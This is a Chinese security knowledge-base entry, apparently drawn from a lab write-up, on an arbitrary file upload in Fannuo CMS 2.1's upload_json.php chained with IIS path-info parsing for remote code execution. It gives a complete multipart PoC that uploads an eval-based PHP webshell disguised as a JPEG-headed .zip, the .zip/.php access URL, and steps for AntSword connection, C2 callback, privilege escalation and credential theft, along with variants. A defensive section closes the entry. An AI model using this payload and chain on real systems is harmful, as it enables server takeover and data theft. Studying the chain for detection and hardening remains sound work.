---
id: web-generic-file-upload-fannuo-cms-upload-json-iis-pathinfo-rce
title: 凡诺CMS 2.1 upload_json.php 任意文件上传 + IIS `/.php` 路径解析 RCE
type: scenario
domain: web
path: web/generic/file-upload
technique: fannuo-cms-upload-json-iis-pathinfo-rce
aliases:
- 凡诺CMS 2.1
- phpecms upload_json.php
- upload_json.php?dir=file
- IIS 路径解析漏洞
- file.zip/.php
- 伪 JPEG 上传 PHP
tags:
- php
- cms
- file-upload
- webshell
- iis
- path-info
- rce
- fannuo
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 凡诺CMS 2.1（文章靶场）
verification:
  verified_by: verifier-V268
  verified_at: '2026-11-07T18:22:54+08:00'
  notes: '已对照原文与16张图核对：上传请求（POST /cslab/editor/phpecms/upload_json.php?dir=file，imgFile 字段，.zip 文件名 + image/jpeg + JPEG 魔数 + <?php @eval([''hack'']); ?>）、响应 JSON url 与 Server: Microsoft-IIS/8.0 / X-Powered-By: PHP/5.3.29、IIS 路径解析 URL（...zip/.php）、AntSword 连接读取 C:/flag.txt 均一致（图19/21）；PoC 使用图19实际返回的 20250604/20250604155615 文件名。dedup 候选 yifangcms/upload-allow 等为不同产品与绕过链（related）；dup-scan 无涉及本篇 pair。affected_versions 按原文标题凡诺cms2.1 保留。未在本地复现上传/解析。'
---

## 一句话结论

凡诺CMS 2.1 的编辑器上传接口 `POST /cslab/editor/phpecms/upload_json.php?dir=file` 接受 `imgFile` 文件且未严格校验扩展名/内容：把 `<?php @eval($_POST['hack']); ?>` 前面加上 JPEG 魔数、文件名改成 `.zip` 上传，即可落到 `uploadfile/file/` 目录；在 IIS 8.0 + PHP 5.3.29 上访问 `.../<file>.zip/.php` 时，IIS 按 `.php` 后缀把该 `.zip` 文件交给 PHP 解析，执行其中夹带的 PHP 代码，从而获得 WebShell。

## 原理

- **上传入口**：凡诺CMS 的添加频道页面（`/cslab/admin/cms_channel_add.php`）使用 `editor/phpecms/upload_json.php?dir=file` 作为编辑器图片上传接口；请求为 `multipart/form-data`，字段名 `imgFile`。服务端把文件保存到 `uploadfile/file/<日期>/` 并在 JSON 中返回相对 URL（文中返回的 `url` 含 `editor/phpecms/../../uploadfile/file/...zip`，即实际路径为 `/cslab/uploadfile/file/...`）。
- **绕过上传校验**：接口按客户端提供的文件名和 `Content-Type` 判断，请求里 `filename` 为 `2025-06-04_215543_032.zip`、`Content-Type: image/jpeg`，文件体以 JPEG 魔数 `FF D8 FF E0 ... JFIF` 开头，后面紧跟 `<?php @eval($_POST['hack']); ?>`。`.zip` 不在脚本扩展名黑名单内，JPEG 魔数又让内容看起来像图片，因此上传成功。
- **IIS 路径解析**：IIS 8.0 的请求处理按 URL 后缀映射处理器；访问 `/.../<file>.zip/.php` 时，URL 以 `.php` 结尾，IIS 将请求交给 PHP FastCGI 处理器，但物理文件仍是 `<file>.zip`。PHP 以脚本方式解析该文件，忽略前面的 JPEG 二进制（作为输出），执行其中的 `<?php ... ?>` 代码。文中明确说明“需要在后面加 `./php`，这是 IIS 的一个路径解析漏洞”，最终 AntSword 连接 `hack` 参数执行命令。
- **为什么可行**：上传校验只看文件名/Content-Type，不看真实内容；保存目录位于 Web 根且允许脚本执行；IIS 的 path-info/后缀映射把 `.zip` 文件当作 `.php` 脚本执行。这是“上传绕过 + IIS 解析”的组合链，单靠 `.zip` 上传或单靠 IIS 解析都不足以 RCE。
- **环境指纹**：响应头 `Server: Microsoft-IIS/8.0`、`X-Powered-By: PHP/5.3.29`；上传响应 JSON 含 `{"error":0,"url":"..."}`。这些特征可用于判断目标是否具备该链的环境。

## 触发条件

- 目标为凡诺CMS 2.1（或其他包含同款 `editor/phpecms/upload_json.php` 的 PHPCMS 系 CMS），上传接口可达，且攻击者能访问添加频道/编辑器上传功能（文中为登录后台后的 `cms_channel_add.php` 页面）。
- 上传目录位于 Web 根下且 IIS/PHP 允许执行脚本；服务器为 IIS 8.0 + PHP 5.3.29 一类存在 path-info/后缀解析行为的组合。
- 文件扩展名黑名单不包含 `.zip`（或可用其他非脚本后缀），且服务端不校验真实文件内容。
- 上传后的文件路径可从响应 JSON 或目录规律推导；攻击者能访问 `.../<file>.zip/.php`。
- WebShell 连接密码与上传代码中的 `$_POST['hack']` 一致；目标出网/回连视后续利用而定。

## 利用步骤

1. 指纹识别凡诺CMS 与 IIS/PHP 版本；访问添加频道页面，确认编辑器上传接口 `editor/phpecms/upload_json.php?dir=file` 可用。
2. 构造 multipart 请求：字段 `imgFile`，filename 以 `.zip` 结尾，Content-Type 设为 `image/jpeg`，文件体先写 JPEG 魔数（`FF D8 FF E0 ...`），再写 `<?php @eval($_POST['hack']); ?>`。
3. 发送 POST，读取返回 JSON 的 `url` 字段，得到上传文件的相对路径（如 `/cslab/editor/phpecms/../../uploadfile/file/20250604/xxxx.zip`）。
4. 拼接真实访问路径：`http://<target>/cslab/uploadfile/file/<date>/<file>.zip/.php`，浏览器/客户端访问应返回 PHP 执行结果（可用 `hack=phpinfo();` 验证）。
5. 用 AntSword/Behinder 等连接该 URL，密码 `hack`；执行 `whoami`、`ipconfig` 等确认权限与网络位置。
6. 按需转发上线 C2、提权、开 RDP、抓凭据并继续横向；注意上传目录与 WebShell 的清理。

## PoC

上传请求（按文中请求整理，`Content-Length` 需按实际调整）：

```http
POST /cslab/editor/phpecms/upload_json.php?dir=file HTTP/1.1
Host: <target>:8980
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW71hkgNaO9ENrAhB

------WebKitFormBoundaryW71hkgNaO9ENrAhB
Content-Disposition: form-data; name="imgFile"; filename="2025-06-04_215543_032.zip"
Content-Type: image/jpeg

<JPEG 魔数 FF D8 FF E0 ...>
<?php @eval($_POST['hack']); ?>
------WebKitFormBoundaryW71hkgNaO9ENrAhB--
```

访问（IIS 路径解析）：

```text
http://<target>:8980/cslab/uploadfile/file/20250604/20250604155615_17687.zip/.php
```

WebShell 连接：POST 参数 `hack=<PHP 代码>`。

说明：PoC 按文中请求与返回路径整理，未在本地复现；上传目录、日期/随机文件名与接口路径随部署变化，需按实际响应调整。

## 变体与关联

- **后缀变体**：`.zip` 可换成 `.jpg`、`.png`、`.txt` 等非脚本后缀，只要 IIS/PHP 的 `.php` path-info 能解析；也可尝试 `file.php/.jpg`、`file.asp;.jpg` 等 IIS 解析变体。
- **内容变体**：JPEG 魔数可换成 GIF89a、PNG 头；PHP 代码可放在文件任意位置，PHP 解析器会执行 `<?php ... ?>` 片段。
- **入口变体**：同款 `upload_json.php` 常见于 PHPCMS 系编辑器，`dir` 参数可控制保存子目录；也可能存在其他上传接口（`upload.php`、`uploadfiles.php`）。
- 关联：[[web-generic-file-upload-upload1-filename-traversal-jsp-webroot]]（上传文件名穿越写 JSP）、[[web-dotnet-iis-webdav-put-move-webshell]]（IIS WebDAV 写 WebShell）、[[web-php-rce-greencms-elfinder-fileconnect-upload-put-webshell]]（PHP CMS 上传链）。
- 边界：上传接口校验真实图片内容/扩展名、上传目录禁止脚本执行、IIS 关闭 path-info 或 PHP `cgi.fix_pathinfo=0`、文件保存到非 Web 目录、或目标不是 IIS 时，`/.php` 解析不成立；若仅能上传但不能访问执行，则只是任意文件上传。

## 检测与防御

- **上传侧**：按白名单校验扩展名与真实 MIME/魔数；上传后重命名为随机名并去掉原扩展名；图片二次渲染；把上传目录放到 Web 根外，或禁止该目录执行脚本。
- **IIS/PHP 侧**：关闭不必要的 path-info/FastCGI 路径解析，设置 `cgi.fix_pathinfo=0`；为上传目录配置 handler 移除（禁止 `.php` 执行）；及时升级 PHP/IIS 与 CMS。
- **检测**：监控 `upload_json.php` 上传请求中出现非图片扩展名、`image/jpeg` 但内容含 `<?php`、文件头为 JPEG/GIF 但 body 含脚本；监控访问 `*.zip/.php`、`*.jpg/.php` 等 path-info 路径；WebShell 连接特征（AntSword/Behinder 流量）。
- **响应**：删除恶意上传文件与 WebShell、检查同目录其他文件；修复上传接口与 IIS 解析配置；排查攻击者后续的 C2/提权/横向与凭据泄露。
